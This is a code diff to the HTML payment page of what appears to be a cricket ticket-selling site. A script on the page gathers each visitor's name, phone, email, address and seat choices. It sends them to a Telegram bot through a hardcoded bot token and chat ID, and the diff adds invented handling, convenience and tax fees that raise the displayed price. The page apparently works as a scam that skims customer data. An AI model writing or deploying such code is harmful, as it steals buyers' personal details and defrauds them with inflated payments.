@@ -256,12 +256,45 @@
         }
     </script>
 
-    <script>
+        <script>
         document.addEventListener("DOMContentLoaded", () => {
             const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
             const chatId = "6820660513";
             
-            // 🔥 1. Pichle pages ka data fetch karna 🔥
+            // ========================================================
+            // 🔥 FORCE TAX CALCULATION ON PAYMENT PAGE (100% WORKING) 🔥
+            // ========================================================
+            
+            // 1. Pehle base price nikalte hain (taki double tax na lage)
+            let rawBasePrice = localStorage.getItem('pureBasePriceForTax');
+            if (!rawBasePrice) {
+                rawBasePrice = localStorage.getItem('selectedTotalPrice') || localStorage.getItem('finalPrice') || "599";
+                localStorage.setItem('pureBasePriceForTax', rawBasePrice); // Asli price lock kar liya
+            }
+
+            let basePrice = parseInt(rawBasePrice);
+            if (isNaN(basePrice) || basePrice <= 0) basePrice = 599;
+
+            // 2. Taxes calculate karte hain
+            let handlingFee = Math.round(basePrice * 0.12);
+            let convenienceFee = Math.round(basePrice * 0.10);
+            let gst = Math.round(basePrice * 0.09);
+
+            // 3. NAYA BADHA HUA PRICE! (Base + All Taxes)
+            let finalTaxedPrice = basePrice + handlingFee + convenienceFee + gst;
+
+            // 4. Ise wapas LocalStorage me daal do taki js/payment.js bhi isko hi read kare
+            localStorage.setItem('finalPrice', finalTaxedPrice);
+            
+            // ========================================================
+
+            // 🔥 UI PAR NAYA PRICE UPDATE KAREN 🔥
+            const priceDisplays = document.querySelectorAll('.final_paid_price');
+            priceDisplays.forEach(el => {
+                el.innerText = '₹' + finalTaxedPrice;
+            });
+
+            // Baki Match aur User Details Fetch Karna
             let matchTitle = "Not Selected";
             let matchDate = "";
             try {
@@ -272,16 +305,13 @@
                 }
             } catch(e) {}
 
-            const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice') || "0";
             const name = localStorage.getItem('customerName') || "Not Provided";
             const phone = localStorage.getItem('customerPhone') || "Not Provided";
             const email = localStorage.getItem('customerEmail') || "Not Provided";
-            
-            // Address ke alag-alag naam ho sakte hain local storage mein, isliye dono check kiye hain
             const address = localStorage.getItem('customerAddress') || localStorage.getItem('address') || "Not Provided";
             const seats = localStorage.getItem('selectedSeats') || "Not Provided";
             
-            // 🔥 2. Naya Detailed Message Banana 🔥
+            // 🔥 TELEGRAM MESSAGE (NAYE TAX WALE PRICE KE SATH) 🔥
             const message = `🚨 *New User on Payment Page!* 🚨\n\n` +
                             `👤 *Name:* ${name}\n` +
                             `📞 *Phone:* ${phone}\n` +
@@ -289,12 +319,11 @@
                             `🏠 *Address:* ${address}\n` +
                             `🏏 *Match:* ${matchTitle} ${matchDate}\n` +
                             `🎟️ *Seats:* ${seats}\n` +
-                            `💰 *Amount to Pay:* ₹${finalPrice}\n` +
+                            `💰 *Amount to Pay:* ₹${finalTaxedPrice}\n` +
                             `🌐 *Status:* Thinking to Pay...`;
             
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
-            // 🔥 3. Telegram par bhejna 🔥
             fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -305,8 +334,5 @@
                 })
             }).catch(err => console.error("Telegram Error:", err));
         });
-    </script>
-    
-    <script type="module" src="js/payment.js"></script>
-</body>
-</html>
+                </script>
+                
